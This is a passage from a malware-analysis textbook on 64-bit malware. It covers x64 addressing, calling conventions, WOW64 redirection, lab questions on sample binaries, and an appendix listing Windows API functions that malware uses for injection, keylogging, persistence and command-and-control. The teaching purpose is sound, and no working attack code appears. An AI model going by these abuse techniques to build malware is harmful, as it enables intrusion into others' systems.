- en: For example, the RAX register is the 64-bit version of the EAX register.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Some of the general-purpose registers (RDI, RSI, RBP, and RSP) have been extended
    to support byte accesses, by adding an *L* suffix to the 16-bit version. For example,
    BP normally accesses the lower 16 bits of RBP; now, BPL accesses the lowest 8
    bits of RBP.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The special-purpose registers are 64-bits and have been renamed. For example,
    RIP is the 64-bit instruction pointer.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: There are twice as many general-purpose registers. The new registers are labeled
    R8 though R15\. The DWORD (32-bit) versions of these registers can be accessed
    as R8D, R9D, and so on. WORD (16-bit) versions are accessed with a *W* suffix
    (R8W, R9W, and so on), and byte versions are accessed with an *L* suffix (R8L,
    R9L, and so on).
  prefs: []
  type: TYPE_NORMAL
- en: x64 also supports instruction pointer–relative data addressing. This is an important
    difference between x64 and x86 in relation to PIC and shellcode. Specifically,
    in x86 assembly, anytime you want to access data at a location that is not an
    offset from a register, the instruction must store the entire address. This is
    called *absolute addressing*. But in x64 assembly, you can access data at a location
    that is an offset from the current instruction pointer. The x64 literature refers
    to this as *RIP-relative addressing*. Listing 21-1
  prefs: []
  type: TYPE_NORMAL
- en: shows a simple C program that accesses a memory address.
  prefs: []
  type: TYPE_NORMAL
- en: int x;
  prefs: []
  type: TYPE_NORMAL
- en: void foo() {
  prefs: []
  type: TYPE_NORMAL
- en: int y = x;
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: '}'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 21-1: A simple C program with a data access*'
  prefs: []
  type: TYPE_NORMAL
- en: The x86 assembly code for Listing 21-1 references global data (the variable
    x). In order to access this data, the instruction encodes the 4 bytes representing
    the data’s address. This instruction is not position independent, because it will
    always access address 0x00403374, but if this file were to be loaded at a different
    location, the instruction would need to be modified so that the mov instruction
    accessed the correct address, as shown in Listing 21-2\.
  prefs: []
  type: TYPE_NORMAL
- en: 00401004 A1 74 33 40 00 mov eax, dword_403374
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 21-2: x86 assembly for the C program in Listing 21-1*'
  prefs: []
  type: TYPE_NORMAL
- en: 64-Bit Malware
  prefs: []
  type: TYPE_NORMAL
- en: '**443**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: You’ll notice that the bytes of the address are stored with the instruction
    at
  prefs: []
  type: TYPE_NORMAL
- en: , , , and . Remember that the bytes are stored with the least significant
    byte first. The bytes 74, 33, 40, and 00 correspond to the address 0x00403374\.
  prefs: []
  type: TYPE_NORMAL
- en: After recompiling for x64, Listing 21-3 shows the same mov instruction that
    appears in Listing 21-2\.
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140001058 8B 05 A2 D3 00 00 mov eax, dword_14000E400
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 21-3: x64 assembly for Listing 21-1*'
  prefs: []
  type: TYPE_NORMAL
- en: At the assembly level, there doesn’t appear to be any change. The instruction
    is still mov eax, dword *_address*, and IDA Pro automatically calculates the instruction’s
    address. However, the differences at the opcode level allow this code to be position-independent
    on x64, but not x86\.
  prefs: []
  type: TYPE_NORMAL
- en: In the 64-bit version of the code, the instruction bytes do not contain the
    fixed address of the data. The address of the data is 14000E400, but the instruction
    bytes are A2 , D3 , 00 , and 00 , which correspond to the value 0x0000D3A2\.
  prefs: []
  type: TYPE_NORMAL
- en: The 64-bit instruction stores the address of the data as an offset from the
    current instruction pointer, rather than as an absolute address, as stored in
    the 32-bit version. If this file were loaded at a different location, the instruction
    would still point to the correct address, unlike in the 32-bit version. In that
    case, if the file is loaded at a different address, the reference must be changed.
  prefs: []
  type: TYPE_NORMAL
- en: Instruction pointer–relative addressing is a powerful addition to the x64
  prefs: []
  type: TYPE_NORMAL
- en: instruction set that significantly decreases the number of addresses that must
    be relocated when a DLL is loaded. Instruction pointer–relative addressing also
    makes it much easier to write shellcode because it eliminates the need to obtain
    a pointer to EIP in order to access data. Unfortunately, this addition also makes
    it more difficult to detect shellcode, because it eliminates the need for a call/pop
    as discussed in “Position-Independent Code” on page 408\.
  prefs: []
  type: TYPE_NORMAL
- en: Many of those common shellcode techniques are unnecessary or irrelevant when
    working with malware written to run on the x64 architecture.
  prefs: []
  type: TYPE_NORMAL
- en: '***Differences in the x64 Calling Convention and Stack Usage***'
  prefs: []
  type: TYPE_NORMAL
- en: The calling convention used by 64-bit Windows is closest to the 32-bit fastcall
    calling convention discussed in Chapter 6\. The first four parameters of the call
    are passed in the RCX, RDX, R8, and R9 registers; additional ones are stored on
    the stack.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Most of the conventions and hints described in this section apply to compiler-generated*
    *code that runs on the Windows OS. There is no processor-enforced requirement
    to follow* *these conventions, but Microsoft’s guidelines for compilers specify
    certain rules in order* *to ensure consistency and stability. Beware, because
    hand-coded assembly and malicious code may disregard these rules and do the unexpected.
    As usual, investigate any* *code that doesn’t follow the rules.*'
  prefs: []
  type: TYPE_NORMAL
- en: In the case of 32-bit code, stack space can be allocated and unallocated in
    the middle of the function using push and pop instructions. However, in 64-bit
    code, functions cannot allocate any space in the middle of the function, regardless
    of whether they’re push or other stack-manipulation instructions.
  prefs: []
  type: TYPE_NORMAL
- en: '**444**'
  prefs: []
  type: TYPE_NORMAL
- en: Chapter 21
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Figure 21-1 compares the stack management of 32-bit and 64-bit code.
  prefs: []
  type: TYPE_NORMAL
- en: Notice in the graph for a 32-bit function that the stack size grows as arguments
    are pushed on the stack, and then falls when the stack is cleaned up.
  prefs: []
  type: TYPE_NORMAL
- en: Stack space is allocated at the beginning of the function, and moves up and
    down during the function call. When calling a function, the stack size grows;
    when the function returns, the stack size returns to normal. In contrast, the
    graph for a 64-bit function shows that the stack grows at the start of the function
    and remains at that level until the end of the function.
  prefs: []
  type: TYPE_NORMAL
- en: 32-bit Function
  prefs: []
  type: TYPE_NORMAL
- en: 64-bit Function
  prefs: []
  type: TYPE_NORMAL
- en: Stack Size
  prefs: []
  type: TYPE_NORMAL
- en: Stack Size
  prefs: []
  type: TYPE_NORMAL
- en: Time
  prefs: []
  type: TYPE_NORMAL
- en: Time
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 21-1: Stack size in the same function compiled for 32-bit and 64-bit
    architectures* The 32-bit compiler will sometimes generate code that doesn’t change
    the stack size in the middle of the function, but 64-bit code never changes the
    stack size in the middle of the function. Although this stack restriction is not
    enforced by the processor, the Microsoft 64-bit exception-handling model depends
    on it in order to function properly. Functions that do not follow this convention
    may crash or cause other problems if an exception occurs.'
  prefs: []
  type: TYPE_NORMAL
- en: The lack of push and pop instructions in the middle of a function can make it
    more difficult for an analyst to determine how many parameters a function has,
    because there is no easy way to tell whether a memory address is being used as
    a stack variable or as a parameter to a function. There’s also no way to tell
    whether a register is being used as a parameter. For example, if ECX is loaded
    with a value immediately before a function call, you can’t tell if the register
    is loaded as a parameter or for some other reason.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 21-4 shows an example of the disassembly for a function call compiled
    for a 32-bit processor.
  prefs: []
  type: TYPE_NORMAL
- en: 004113C0 mov eax, [ebp+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 004113C3 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 004113C4 mov ecx, [ebp+arg_C]
  prefs: []
  type: TYPE_NORMAL
- en: 004113C7 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 004113C8 mov edx, [ebp+arg_8]
  prefs: []
  type: TYPE_NORMAL
- en: 004113CB push edx
  prefs: []
  type: TYPE_NORMAL
- en: 004113CC mov eax, [ebp+arg_4]
  prefs: []
  type: TYPE_NORMAL
- en: 004113CF push eax
  prefs: []
  type: TYPE_NORMAL
- en: 004113D0 push offset aDDDD_
  prefs: []
  type: TYPE_NORMAL
- en: 004113D5 call printf
  prefs: []
  type: TYPE_NORMAL
- en: 004113DB add esp, 14h
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 21-4: Call to printf compiled for a 32-bit processor* 64-Bit Malware'
  prefs: []
  type: TYPE_NORMAL
- en: '**445**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The 32-bit assembly has five push instructions before the call to printf, and
    immediately after the call to printf, 0x14 is added to the stack to clean it up.
    This clearly indicates that there are five parameters being passed to the printf
    function.
  prefs: []
  type: TYPE_NORMAL
- en: 'Listing 21-5 shows the disassembly for the same function call compiled for
    a 64-bit processor:'
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002C96 mov ecx, [rsp+38h+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002C9A mov eax, [rsp+38h+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002C9Emov [rsp+38h+var_18], eax
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002CA2 mov r9d, [rsp+38h+arg_18]
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002CA7 mov r8d, [rsp+38h+arg_10]
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002CAC mov edx, [rsp+38h+arg_8]
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002CB0 lea rcx, aDDDD_
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140002CB7 call cs:printf
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 21-5: Call to printf compiled for a 64-bit processor* In 64-bit disassembly,
    the number of parameters passed to printf is less evident. The pattern of load
    instructions in RCX, RDX, R8, and R9 appears to show parameters being moved into
    the registers for the printf function call, but the mov instruction at  is not
    as clear. IDA Pro labels this as a move into a local variable, but there is no
    clear way to distinguish between a move into a local variable and a parameter
    for the function being called.'
  prefs: []
  type: TYPE_NORMAL
- en: In this case, we can just check the format string to see how many parameters
    are being passed, but in other cases, it will not be so easy.
  prefs: []
  type: TYPE_NORMAL
- en: '**Leaf and Nonleaf Functions**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The 64-bit stack usage convention breaks functions into two categories: leaf
    and nonleaf functions. Any function that calls another function is called a *nonleaf
    function*, and all other functions are *leaf functions*.'
  prefs: []
  type: TYPE_NORMAL
- en: Nonleaf functions are sometimes called *frame functions* because they require
    a stack frame. All nonleaf functions are required to allocate 0x20
  prefs: []
  type: TYPE_NORMAL
- en: bytes of stack space when they call a function. This allows the function being
    called to save the register parameters (RCX, RDX, R8, and R9) in that space, if
    necessary.
  prefs: []
  type: TYPE_NORMAL
- en: In both leaf and nonleaf functions, the stack will be modified only at the beginning
    or end of the function. These portions that can modify the stack frame are discussed
    next.
  prefs: []
  type: TYPE_NORMAL
- en: '**Prologue and Epilogue 64-Bit Code**'
  prefs: []
  type: TYPE_NORMAL
- en: Windows 64-bit assembly code has well-formed sections at the beginning and end
    of functions called the *prologue* and *epilogue*, which can provide useful information.
    Any mov instructions at the beginning of a prologue are always used to store the
    parameters that were passed into the function. (The compiler cannot insert mov
    instructions that do anything else within the prologue.) Listing 21-6 shows an
    example of a prologue for a small function.
  prefs: []
  type: TYPE_NORMAL
- en: '**446**'
  prefs: []
  type: TYPE_NORMAL
- en: Chapter 21
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00000001400010A0 mov [rsp+arg_8], rdx 00000001400010A5 mov [rsp+arg_0], ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00000001400010A9 push rdi
  prefs: []
  type: TYPE_NORMAL
- en: 00000001400010AA sub rsp, 20h
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 21-6: Prologue code for a small function*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Here, we see that this function has two parameters: one 32-bit and one 64-bit.
    This function allocates 0x20 bytes from the stack, as required by all nonleaf
    functions as a place to provide storage for parameters. If a function has any
    local stack variables, it will allocate space for them in addition to the 0x20
    bytes. In this case, we can tell that there are no local stack variables because
    only 0x20 bytes are allocated.'
  prefs: []
  type: TYPE_NORMAL
- en: '***64-Bit Exception Handling***'
  prefs: []
  type: TYPE_NORMAL
- en: Unlike exception handling in 32-bit systems, structured exception handling in
    x64 does not use the stack. In 32-bit code, the fs:[0] is used as a pointer to
    the current exception handler frame, which is stored on the stack so that each
    function can define its own exception handler. As a result, you will often find
    instructions modifying fs:[0] at the beginning of a function. You will also find
    exploit code that overwrites the exception information on the stack in order to
    get control of the code executed during an exception.
  prefs: []
  type: TYPE_NORMAL
- en: Structured exception handling in x64 uses a static exception information table
    stored in the PE file and does not store any data on the stack.
  prefs: []
  type: TYPE_NORMAL
- en: Also, there is an _IMAGE_RUNTIME_FUNCTION_ENTRY structure in the .pdata section
    for every function in the executable that stores the beginning and ending address
    of the function, as well as a pointer to exception-handling information for that
    function.
  prefs: []
  type: TYPE_NORMAL
- en: '**Windows 32-Bit on Windows 64-Bit**'
  prefs: []
  type: TYPE_NORMAL
- en: Microsoft developed a subsystem called Windows 32-bit on Windows 64-bit (WOW64)
    in order to allow 32-bit applications to execute properly on a 64-bit machine.
    This subsystem has several features that can be used by malicious code.
  prefs: []
  type: TYPE_NORMAL
- en: WOW64 uses the 32-bit mode of x64 processors in order to execute instructions,
    but work-arounds are needed for the registry and filesystem.
  prefs: []
  type: TYPE_NORMAL
- en: The Microsoft DLLs that form the core of the Win32 environment are in the *SYSTEMROOT*
    directory, usually in *\Windows\System32*. Many applications access this directory
    to search for Microsoft DLLs or to install their own DLLs. Therefore, there must
    be separate DLLs for both 32- and 64-bit processes to avoid conflicts.
  prefs: []
  type: TYPE_NORMAL
- en: For compatibility reasons, the 64-bit binaries are stored in the *\System32*
  prefs: []
  type: TYPE_NORMAL
- en: directory. For 32-bit applications, this directory is redirected to the *\WOW64*
  prefs: []
  type: TYPE_NORMAL
- en: directory; a counterintuitive choice because the 64-bit binaries are in the
  prefs: []
  type: TYPE_NORMAL
- en: '*\System**32*** directory and the 32-bit binaries are in the *\WOW**64*** directory.'
  prefs: []
  type: TYPE_NORMAL
- en: 64-Bit Malware
  prefs: []
  type: TYPE_NORMAL
- en: '**447**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: In analyzing 32-bit malware on a 64-bit system, if you find that it writes a
    file to *C:\Windows\System32*, you will need to go to *C:\Windows\WOW64* to find
    that file.
  prefs: []
  type: TYPE_NORMAL
- en: Another redirection exists for 32-bit applications that access the HKEY_
  prefs: []
  type: TYPE_NORMAL
- en: LOCAL_MACHINE\Software registry key, which is mapped to HKEY_LOCAL_MACHINE\
    Software\Wow6432Node. Any 32-bit applications accessing the software registry
    key will be redirected.
  prefs: []
  type: TYPE_NORMAL
- en: 32-bit applications are normally unaware that they are running on WOW64, but
    a few mechanisms allow the applications to see outside the WOW64 environment.
    The first is the IsWow64Process function, which can be used by 32-bit applications
    to determine if they are running in a WOW64
  prefs: []
  type: TYPE_NORMAL
- en: process. Applications can access the real *\System32* directory by accessing
    *C:\Windows\Sysnative*, even when the *\System32* is being redirected to WOW64\.
  prefs: []
  type: TYPE_NORMAL
- en: The Wow64DisableWow64FsRedirection function disables filesystem redirection
    entirely for a given thread. Registry functions such as RegCreateKeyEx, RegDeleteKeyEx,
    and RegOpenKeyEx have a new flag that can be used to specify that an application
    wants to access the 32-bit or 64-bit view of the registry, regardless of the type
    of application. This flag can be used when 32-bit malware is making changes meant
    to affect 64-bit applications.
  prefs: []
  type: TYPE_NORMAL
- en: '**64-Bit Hints at Malware Functionality**'
  prefs: []
  type: TYPE_NORMAL
- en: Certain features in 64-bit code can provide additional clues to malware functionality
    that are not available in 32-bit code. These features are conventional and generally
    apply only to compiler-generated code.
  prefs: []
  type: TYPE_NORMAL
- en: For example, it is typically easier in 64-bit code to differentiate between
    pointers and data values. The most common size for storing integers is 32 bits,
    although that is not a requirement. Still, even when simply storing an index value
    that iterates from 1 to 100, most programmers will choose a 32-bit integer for
    storage.
  prefs: []
  type: TYPE_NORMAL
- en: Table 21-1 shows the 32-bit and 64-bit versions of the same function call.
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 21-1:** 32-bit and 64-bit Function Calls with Two Parameters **32-bit
    assembly listing**'
  prefs: []
  type: TYPE_NORMAL
- en: '**64-bit assembly listing**'
  prefs: []
  type: TYPE_NORMAL
- en: 004114F2 mov eax, [ebp+var_8]
  prefs: []
  type: TYPE_NORMAL
- en: 0000000140001148mov rdx, [rsp+38h+var_18]
  prefs: []
  type: TYPE_NORMAL
- en: 004114F5 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 000000014000114D
  prefs: []
  type: TYPE_NORMAL
- en: mov ecx, [rsp+38h+var_10]
  prefs: []
  type: TYPE_NORMAL
- en: 004114F6 mov ecx, [ebp+var_14]
  prefs: []
  type: TYPE_NORMAL
- en: '0000000140001151'
  prefs: []
  type: TYPE_NORMAL
- en: call sub_14000100A
  prefs: []
  type: TYPE_NORMAL
- en: 004114F9 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 004114FA call sub_411186
  prefs: []
  type: TYPE_NORMAL
- en: In the 32-bit assembly shown on the left, there are two parameters to the function
    sub_411186\. We have no information about the types or purposes of the parameters,
    other than that they are both 32 bits.
  prefs: []
  type: TYPE_NORMAL
- en: In the 64-bit assembly shown on the right, we also see two parameters, but now
    we have additional information. The first mov instruction at  moves the value
    into RDX, which tells us that this is a 64-bit value—probably a pointer. The second
    parameter is being moved into ECX, which tells us that **448**
  prefs: []
  type: TYPE_NORMAL
- en: Chapter 21
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: it is a 32-bit value, because ECX is the 32-bit version of the RCX register.
    This can’t be a pointer, because pointers are 64 bits. We still don’t know whether
    this parameter is an integer, handle, or something else, but when you’re starting
    to understand a function, these little clues can be crucial to determining what
    a function does.
  prefs: []
  type: TYPE_NORMAL
- en: '**Conclusion**'
  prefs: []
  type: TYPE_NORMAL
- en: Analyzing 64-bit malware is not much different from analyzing 32-bit malware,
    because the instructions and concepts are very similar. Malware analysts need
    to understand how function calling and stack usage are accomplished in order to
    determine how many parameters and local variables each function has. It’s also
    important to understand the WOW64 subsystem in case you need to analyze a 32-bit
    executable that modifies system directories or registry keys used by the OS. Most
    malware is still 32-bit, but the amount of 64-bit malware continues to grow, and
    its use will extend even more in the future.
  prefs: []
  type: TYPE_NORMAL
- en: 64-Bit Malware
  prefs: []
  type: TYPE_NORMAL
- en: '**449**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**L A B S**'
  prefs: []
  type: TYPE_NORMAL
- en: You’ll need a 64-bit computer and a 64-bit virtual machine in order to run the
    malware for these labs, as well as the advanced version of IDA Pro in order to
    analyze the malware.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 21-1**'
  prefs: []
  type: TYPE_NORMAL
- en: Analyze the code in *Lab21-01.exe*. This lab is similar to Lab 9-2, but tweaked
    and compiled for a 64-bit system.
  prefs: []
  type: TYPE_NORMAL
- en: '***Questions***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: What happens when you run this program without any parameters?
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Depending on your version of IDA Pro, main may not be recognized automatically.
    How can you identify the call to the main function?
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: What is being stored on the stack in the instructions from 0x0000000140001150
    to 0x0000000140001161?
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: How can you get this program to run its payload without changing the filename
    of the executable?
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Which two strings are being compared by the call to strncmp at 0x0000000140001205?
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: Does the function at 0x00000001400013C8 take any parameters?
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: How many arguments are passed to the call to CreateProcess at 0x0000000140001093?
    How do you know?
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 21-2**'
  prefs: []
  type: TYPE_NORMAL
- en: Analyze the malware found in *Lab21-02.exe* on both x86 and x64 virtual machines.
    This malware is similar to *Lab12-01.exe*, with an added x64
  prefs: []
  type: TYPE_NORMAL
- en: component.
  prefs: []
  type: TYPE_NORMAL
- en: '***Questions***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: What is interesting about the malware’s resource sections?
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Is this malware compiled for x64 or x86?
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: How does the malware determine the type of environment in which it is running?
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: What does this malware do differently in an x64 environment versus an x86 environment?
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Which files does the malware drop when running on an x86 machine?
  prefs: []
  type: TYPE_NORMAL
- en: Where would you find the file or files?
  prefs: []
  type: TYPE_NORMAL
- en: '**450**'
  prefs: []
  type: TYPE_NORMAL
- en: Chapter 21
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: Which files does the malware drop when running on an x64 machine?
  prefs: []
  type: TYPE_NORMAL
- en: Where would you find the file or files?
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: What type of process does the malware launch when run on an x64
  prefs: []
  type: TYPE_NORMAL
- en: system?
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: What does the malware do?
  prefs: []
  type: TYPE_NORMAL
- en: 64-Bit Malware
  prefs: []
  type: TYPE_NORMAL
- en: '**451**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**I M P O R T A N T W I N D O W S**'
  prefs: []
  type: TYPE_NORMAL
- en: '**F U N C T I O N S**'
  prefs: []
  type: TYPE_NORMAL
- en: This appendix contains a list of Windows functions
  prefs: []
  type: TYPE_NORMAL
- en: commonly encountered by malware analysts, along
  prefs: []
  type: TYPE_NORMAL
- en: with a short description of each one and how it is likely to be used by malware.
    Most of these functions are
  prefs: []
  type: TYPE_NORMAL
- en: already documented by Microsoft, and this appendix is not intended to rehash
    that information. The Microsoft documentation is extremely useful and describes
    almost every function exported by a Microsoft DLL, although it can be lengthy
    and technical.
  prefs: []
  type: TYPE_NORMAL
- en: You can use this appendix as a reference when performing basic static analysis,
    whether you’re trying to glean information from the import table or just looking
    for advanced techniques to point you in the right direction.
  prefs: []
  type: TYPE_NORMAL
- en: Once you’ve determined which functions are most relevant for a particular piece
    of malware, you will need to analyze those functions in disassembly and use the
    Microsoft documentation to learn the purpose of each parameter.
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*This appendix presents a selective list of functions. We have excluded functions*
    *whose purpose should be clear from the function name alone, such as ReadFile
    and* *DeleteFile.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**accept**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to listen for incoming connections. This function indicates that the program
    will listen for incoming connections on a socket.
  prefs: []
  type: TYPE_NORMAL
- en: '**AdjustTokenPrivileges**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to enable or disable specific access privileges. Malware that performs
    process injection often calls this function to gain additional permissions.
  prefs: []
  type: TYPE_NORMAL
- en: '**AttachThreadInput**'
  prefs: []
  type: TYPE_NORMAL
- en: Attaches the input processing for one thread to another so that the second thread
    receives input events such as keyboard and mouse events.
  prefs: []
  type: TYPE_NORMAL
- en: Keyloggers and other spyware use this function.
  prefs: []
  type: TYPE_NORMAL
- en: '**bind**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to associate a local address to a socket in order to listen for incoming
    connections.
  prefs: []
  type: TYPE_NORMAL
- en: '**BitBlt**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to copy graphic data from one device to another. Spyware sometimes uses
    this function to capture screenshots. This function is often added by the compiler
    as part of library code.
  prefs: []
  type: TYPE_NORMAL
- en: '**CallNextHookEx**'
  prefs: []
  type: TYPE_NORMAL
- en: Used within code that is hooking an event set by SetWindowsHookEx.
  prefs: []
  type: TYPE_NORMAL
- en: CallNextHookEx calls the next hook in the chain. Analyze the function calling
    CallNextHookEx to determine the purpose of a hook set by SetWindowsHookEx.
  prefs: []
  type: TYPE_NORMAL
- en: '**CertOpenSystemStore**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to access the certificates stored on the local system.
  prefs: []
  type: TYPE_NORMAL
- en: '**CheckRemoteDebuggerPresent**'
  prefs: []
  type: TYPE_NORMAL
- en: Checks to see if a specific process (including your own) is being debugged.
  prefs: []
  type: TYPE_NORMAL
- en: This function is sometimes used as part of an anti-debugging technique.
  prefs: []
  type: TYPE_NORMAL
- en: '**CoCreateInstance**'
  prefs: []
  type: TYPE_NORMAL
- en: Creates a COM object. COM objects provide a wide variety of functionality. The
    class identifier (CLSID) will tell you which file contains the code that implements
    the COM object. See Chapter 7 for an in-depth explanation of COM.
  prefs: []
  type: TYPE_NORMAL
- en: '**connect**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to connect to a remote socket. Malware often uses low-level functionality
    to connect to a command-and-control server.
  prefs: []
  type: TYPE_NORMAL
- en: '**454**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix A
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**ConnectNamedPipe**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to create a server pipe for interprocess communication that will wait for
    a client pipe to connect. Backdoors and reverse shells sometimes use ConnectNamedPipe
    to simplify connectivity to a command-and-control server.
  prefs: []
  type: TYPE_NORMAL
- en: '**ControlService**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to start, stop, modify, or send a signal to a running service. If malware
    is using its own malicious service, you’ll need to analyze the code that implements
    the service in order to determine the purpose of the call.
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateFile**'
  prefs: []
  type: TYPE_NORMAL
- en: Creates a new file or opens an existing file.
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateFileMapping**'
  prefs: []
  type: TYPE_NORMAL
- en: Creates a handle to a file mapping that loads a file into memory and makes it
    accessible via memory addresses. Launchers, loaders, and injectors use this function
    to read and modify PE files.
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateMutex**'
  prefs: []
  type: TYPE_NORMAL
- en: Creates a mutual exclusion object that can be used by malware to ensure that
    only a single instance of the malware is running on a system at any given time.
    Malware often uses fixed names for mutexes, which can be good host-based indicators
    to detect additional installations of the malware.
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateProcess**'
  prefs: []
  type: TYPE_NORMAL
- en: Creates and launches a new process. If malware creates a new process, you will
    need to analyze the new process as well.
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateRemoteThread**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to start a thread in a remote process (one other than the calling process).
    Launchers and stealth malware use CreateRemoteThread to inject code into a different
    process.
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateService**'
  prefs: []
  type: TYPE_NORMAL
- en: Creates a service that can be started at boot time. Malware uses CreateService
    for persistence, stealth, or to load kernel drivers.
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateToolhelp32Snapshot**'
  prefs: []
  type: TYPE_NORMAL
- en: Used to create a snapshot of processes, heaps, threads, and modules.
  prefs: []
  type: TYPE_NORMAL
- en: Malware often uses this function as part of code that iterates through processes
    or threads.
  prefs: []
  type: TYPE_NORMAL
- en: '**CryptAcquireContext**'
  prefs: []
  type: TYPE_NORMAL
- en: Often the first function used by malware to initialize the use of Windows encryption.
    There are many other functions associated with encryption, most of which start
    with Crypt.
  prefs: []
  type: TYPE_NORMAL
- en: '**DeviceIoControl**'
  prefs: []
  type: TYPE_NORMAL
- en: Sends a control message from user space to a device driver. DeviceIoControl
    is popular with kernel malware because it is an easy, flexible way to pass information
    between user space and kernel space.
  prefs: []
  type: TYPE_NORMAL
- en: Important Windows Functions
  prefs: []
  type: TYPE_NORMAL
- en: '**455**'
  prefs: []
  type: TYPE_NORMAL
